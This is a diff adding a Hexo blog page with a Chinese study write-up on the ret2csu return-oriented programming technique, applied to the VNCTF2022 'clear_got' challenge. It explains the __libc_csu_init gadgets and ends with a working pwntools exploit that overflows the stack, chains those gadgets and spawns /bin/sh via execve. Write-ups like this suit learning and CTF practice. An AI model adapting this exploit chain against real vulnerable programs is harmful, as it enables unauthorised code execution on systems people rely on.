@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>ret2csu | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="仅供个人学习参考">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2csu">
+<meta property="og:url" content="http://example.com/2024/04/01/ret2csu/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="仅供个人学习参考">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://gateway.pinata.cloud/ipfs/bafkreifmbh4bsjeeeghax7oawvmrsnmfurvooxjy47xxj4szjkrcnz5dca">
+<meta property="og:image" content="https://gateway.pinata.cloud/ipfs/bafkreiatod7ncwgjyitt7kf6nu7o6n3pn2otjsexprqq6fh5povw66wmam">
+<meta property="og:image" content="https://gateway.pinata.cloud/ipfs/bafkreif75gwqjuixh3lufrayfpdeyg3q36pxlpj6egtowwtswp7md7hdxe">
+<meta property="og:image" content="https://gateway.pinata.cloud/ipfs/bafkreicguin2eakqnkpb4qo5g4evtnd5tjuyyikef6ojo6qvnndqn53ouq">
+<meta property="og:image" content="https://gateway.pinata.cloud/ipfs/bafkreiclisxzqp2qbggusfz3ibx3g6iurgxjgcvjlcmucbcsck32uzzb7u">
+<meta property="article:published_time" content="2024-04-01T14:00:00.000Z">
+<meta property="article:modified_time" content="2024-04-08T12:20:46.929Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="ROP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gateway.pinata.cloud/ipfs/bafkreifmbh4bsjeeeghax7oawvmrsnmfurvooxjy47xxj4szjkrcnz5dca">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-ret2csu" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/04/01/ret2csu/" class="article-date">
+  <time class="dt-published" datetime="2024-04-01T14:00:00.000Z" itemprop="datePublished">2024-04-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      ret2csu
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><em>仅供个人学习参考</em>  </p>
+<span id="more"></span>
+
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>漏洞来源于_libc_csu_init 这个文件，它原本是用于对程序进行初始化，但是它的一些代码片段可以被我们利用<br>如图<br><img src="https://gateway.pinata.cloud/ipfs/bafkreifmbh4bsjeeeghax7oawvmrsnmfurvooxjy47xxj4szjkrcnz5dca" alt="1"></p>
+<p>下面我们将0x4007d0 - 0x4007e4的片段称为gadget2，0x4007e6 - 0x4007f4的片段称为gadget1<br>利用gadget1，我们可以实现：对rbx,rbp,r12,r13,r14,r15传参<br>利用gadget2，我们可以实现：将r13的值赋给rdx，将r14的值赋给rsi，将r15d的值赋给edi<br>即我们可以对rbx，rbp，r12，rdx，rsi，edi传参</p>
+<p>注意这段汇编</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmp     rbx, rbp</span><br><span class="line">jnz     short loc_4007D0</span><br></pre></td></tr></table></figure>
+
+<p>它的作用是比较rbx和rbp的值，如果二者<strong>不相等</strong>，就跳转到loc_4007D0这个位置，我们一般不希望它跳转，所以我们一般令rbp&#x3D;1，rbx&#x3D;0（因为上一句汇编是add  rbx, 1  ，即使rbx的值加1）</p>
+<hr>
+<p><em>补充：r15d和rdi都是r15的低32位部分，区别在于，r15d用于32位模式（指处理器模式而不是操作系统架构！！），rdi用于64位模式，并且RDI可以访问更大的内存空间</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]</span><br></pre></td></tr></table></figure>
+<p>ds: 是段寄存器前缀，用于指定数据段寄存器。它表示要访问的数据存储在数据段中。这句汇编代码的意思是call __frame_dummy_init_array_entry - 600E10h这个地址的函数，该地址通过r12+rbx*8计算得出，并且数据存储在数据段中。</p>
+<hr>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p><strong>VNCTF2022公开赛clear_got</strong></p>
+<p><img src="https://gateway.pinata.cloud/ipfs/bafkreiatod7ncwgjyitt7kf6nu7o6n3pn2otjsexprqq6fh5povw66wmam" alt="1"></p>
+<p><img src="https://gateway.pinata.cloud/ipfs/bafkreif75gwqjuixh3lufrayfpdeyg3q36pxlpj6egtowwtswp7md7hdxe" alt="2"></p>
+<p>可以看到存在栈溢出，无binsh字段，无system函数,开启了nx保护<br>注意这个函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(&amp;qword_601008, <span class="number">0</span>, <span class="number">0x38</span>uLL);</span><br></pre></td></tr></table></figure>
+<p>它将&amp;qword_601008往上0x38大小的数据覆写为0，即下面这段数据<br><img src="https://gateway.pinata.cloud/ipfs/bafkreicguin2eakqnkpb4qo5g4evtnd5tjuyyikef6ojo6qvnndqn53ouq" alt="1"><br>发现这段数据是plt表的内容，即函数执行到这里，plt表的内容就被清空了<br>于是我们考虑利用系统调用</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>
+<p>64位下，其调用号为0x3b<br>回顾一下：x86_64：syscall调用号存放于rax  syscall参数（传参顺序）：rdi rsi rdx r10 r8 r9</p>
+<p>首先我们要能控制rax，其次往.bss段写入’&#x2F;bin&#x2F;sh’，最后分别控制rdi和rsi</p>
+<h3 id="如何控制rax？"><a href="#如何控制rax？" class="headerlink" title="如何控制rax？"></a>如何控制rax？</h3><p><em>就本题而言，没有出现’pop rax ret’字段，所以我们要另辟蹊径</em></p>
+<blockquote>
+</blockquote>
+<pre><code>*调用 read 函数*
+mov rax, 0      ; 系统调用号为 0 表示 read
+mov rdi, fd     ; 文件描述符
+mov rsi, buf    ; 缓冲区地址
+mov rdx, buf_len ; 读取的最大字节数
+syscall
+
+
+*检查返回值*
+cmp rax, 0      ; 如果 rax 大于 0，则表示成功读取了字节数
+jl error        ; 如果 rax 小于 0，则表示发生了错误
+; 在这里可以处理读取的数据
+
+*正常退出*
+mov eax, 60     ; 系统调用号为 60 表示 exit
+xor edi, edi    ; 退出码为 0
+syscall
+</code></pre>
+<blockquote>
+</blockquote>
+<p><em>write同理</em><br>可以看出在x86_64架构下，<strong>read和write函数的返回值会存放在rax寄存器</strong>，所以我们可以利用这两个函数来控制rax</p>
+<hr>
+<p>康康gadget<br><img src="https://gateway.pinata.cloud/ipfs/bafkreiclisxzqp2qbggusfz3ibx3g6iurgxjgcvjlcmucbcsck32uzzb7u" alt="0"><br>一堆r12 13啥啥的，所以我们得利用_libc_csu_init 来构造rop链</p>
+<p>在x86_64架构下，main函数的返回值通常存放在寄存器 rax 中,而main函数正常执行最后有return 0，故rax里面已经存放着0，并且read函数的系统调用号刚好是0，所以我们可以直接syscall read</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&quot;./clear_got&quot;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x7fffffffdea0</span>-<span class="number">0x7fffffffde40</span></span><br><span class="line">syscall_addr=<span class="number">0x040077E</span></span><br><span class="line">gadget1=<span class="number">0x04007Ea</span> <span class="comment">## 不能是0x4007e6 即不包括&#x27;add rsp, 8&#x27;这句汇编</span></span><br><span class="line">gadget2=<span class="number">0x04007D0</span></span><br><span class="line">tem_proc=<span class="number">0x600e48</span> <span class="comment">#用ida看到的tem_proc地址是0x0400804，我们利用gdb的search -p 0x0400804 就可以查出指向该地址的地址（为啥要该地址的地址下面会讲）</span></span><br><span class="line">bss_addr=<span class="number">0x0601060</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(offset+<span class="number">8</span>) <span class="comment">##栈溢出</span></span><br><span class="line">payload+=p64(gadget1) <span class="comment">#ret</span></span><br><span class="line">payload+=p64(<span class="number">0</span>) <span class="comment">#rbx</span></span><br><span class="line">payload+=p64(<span class="number">1</span>) <span class="comment">#rbp</span></span><br><span class="line">payload+=p64(tem_proc+<span class="number">0x8</span>) <span class="comment">#r12 使得gadget2中的call指令call的是temproc这个空函数，避免造成影响，0x8 对应 rbx*8   想要用call去跳转到一个地址A，那就必须用一个指向地址A的地址B放到call后面</span></span><br><span class="line">payload+=p64(<span class="number">59</span>) <span class="comment"># r13——&gt;rdx 59为execve 在64位架构下的系统调用号   *读取的最大字节数 ；读取成功后，read函数将返回一个 ssize_t 类型的值，表示实际读取的字节数，即我们这里填入的59</span></span><br><span class="line">payload+=p64(bss_addr) <span class="comment">#r14——&gt;rsi 传参,我们要利用read往bss段写入&#x27;binsh&#x27;   *缓冲区地址</span></span><br><span class="line">payload+=p64(<span class="number">0</span>) <span class="comment">#r15(r15d)——&gt;edi  *文件描述符</span></span><br><span class="line">payload+=p64(gadget2) <span class="comment">#ret  </span></span><br><span class="line">payload+=p64(<span class="number">0</span>) <span class="comment">#rbx</span></span><br><span class="line">payload+=p64(<span class="number">1</span>) <span class="comment">#rbp</span></span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x8</span>) <span class="comment">#r12  利用call函数来执行填入到.bss段里的syscall</span></span><br><span class="line">payload+=p64(<span class="number">0</span>) <span class="comment">#r13——&gt;rdx</span></span><br><span class="line">payload+=p64(<span class="number">0</span>) <span class="comment">#r14——&gt;rsi</span></span><br><span class="line">payload+=p64(bss_addr) <span class="comment">#r15(r15d)——&gt;edi</span></span><br><span class="line">payload+=p64(syscall_addr) <span class="comment">#ret,之后程序会进行系统调用read函数 之后rax的值就变成59</span></span><br><span class="line">payload+=p64(gadget2) <span class="comment">#syscall后的ret</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;Welcome to VNCTF! This is a easy competition.///\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(syscall_addr)+<span class="string">b&#x27;\x00&#x27;</span>.ljust(<span class="number">59</span>,<span class="string">b&#x27;\x00&#x27;</span>)<span class="comment">#往.bss段写入&#x27;/bin/sh&#x27;，这里一定要凑齐59，使得read函数的返回值，也就是让rax变成59</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/04/01/ret2csu/" data-id="clydtigr40004cgbqfe7q88ew" data-title="ret2csu" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ROP/" rel="tag">ROP</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2024/04/01/hexo%E6%8E%A8%E9%80%81%E6%96%87%E7%AB%A0%E5%A4%B1%E8%B4%A5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          hexo推送文章失败解决方案
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2024/03/26/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">格式化字符串漏洞</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ROP/" rel="tag">ROP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tips/" rel="tag">Tips</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/VScode/" rel="tag">VScode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/github/" rel="tag">github</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/" rel="tag">hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ubuntu/" rel="tag">ubuntu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/" rel="tag">动态链接</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A0%86/" rel="tag">堆</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E8%BF%9B%E7%A8%8B/" rel="tag">操作系统 进程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" rel="tag">格式化字符串漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/" rel="tag">虚拟内存</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/ROP/" style="font-size: 20px;">ROP</a> <a href="/tags/Tips/" style="font-size: 10px;">Tips</a> <a href="/tags/VScode/" style="font-size: 10px;">VScode</a> <a href="/tags/github/" style="font-size: 10px;">github</a> <a href="/tags/hexo/" style="font-size: 10px;">hexo</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/ubuntu/" style="font-size: 20px;">ubuntu</a> <a href="/tags/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/" style="font-size: 20px;">动态链接</a> <a href="/tags/%E5%A0%86/" style="font-size: 10px;">堆</a> <a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E8%BF%9B%E7%A8%8B/" style="font-size: 10px;">操作系统 进程</a> <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">格式化字符串漏洞</a> <a href="/tags/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/" style="font-size: 10px;">虚拟内存</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">May 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">April 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/05/20/%E6%A0%88%E8%BF%81%E7%A7%BB/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/04/16/VScode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BB%A5%E5%8F%8A%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95/">VScode远程连接虚拟机以及免密登录</a>
+          </li>
+        
+          <li>
+            <a href="/2024/04/15/pwn-environment/">pwn-environment</a>
+          </li>
+        
+          <li>
+            <a href="/2024/04/02/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E8%BF%9B%E7%A8%8B/">操作系统——进程</a>
+          </li>
+        
+          <li>
+            <a href="/2024/04/01/hexo%E6%8E%A8%E9%80%81%E6%96%87%E7%AB%A0%E5%A4%B1%E8%B4%A5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/">hexo推送文章失败解决方案</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2024 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
